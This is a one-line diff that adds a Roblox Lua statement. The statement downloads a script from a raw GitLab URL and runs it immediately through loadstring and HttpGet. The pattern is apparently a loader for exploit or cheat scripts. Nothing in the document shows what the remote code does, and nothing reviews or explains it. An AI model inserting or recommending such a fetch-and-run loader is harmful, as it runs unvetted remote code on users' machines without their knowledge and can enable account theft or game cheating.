@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gitlab.com/RobloxiaUntilDawn/robloxia-until-dawn/-/raw/main/script"))()
